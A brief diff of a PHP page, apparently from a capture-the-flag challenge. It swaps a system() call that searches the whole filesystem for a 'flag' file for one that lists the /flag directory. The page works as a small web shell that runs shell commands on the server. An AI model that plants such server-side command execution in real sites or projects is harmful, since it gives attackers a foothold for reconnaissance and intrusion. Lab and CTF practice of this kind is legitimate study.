@@ -4,7 +4,8 @@
 </form>
 <pre>
     <?php
-        system("find / -name 'flag' 2>/dev/null", $result);
+        //system("find / -name 'flag' 2>/dev/null", $result); // 1
+        system("cd /flag && ls -al", $result);
         echo $result;
     ?>
 </pre>
